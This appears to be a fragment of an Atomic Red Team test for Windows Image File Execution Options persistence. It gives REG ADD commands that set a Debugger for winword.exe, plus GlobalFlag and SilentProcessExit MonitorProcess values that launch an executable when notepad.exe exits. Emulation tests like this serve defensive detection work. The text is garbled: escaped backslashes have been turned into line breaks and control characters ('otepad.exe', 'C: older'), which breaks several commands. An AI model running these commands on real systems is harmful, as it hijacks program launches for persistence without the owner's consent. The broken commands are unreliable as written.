Image File Execution Options.Debugger: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe" /v Debugger /d "C:\folder\AtomicRedTeam.exe"
Image File Execution Options.GlobalFlags:
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
otepad.exe" /v GlobalFlag /t REG_DWORD /d 512
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
otepad.exe" /v ReportingMode /t REG_DWORD /d 1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
otepad.exe" /v MonitorProcess /d "C: older\AtomicRedTeam.exe"
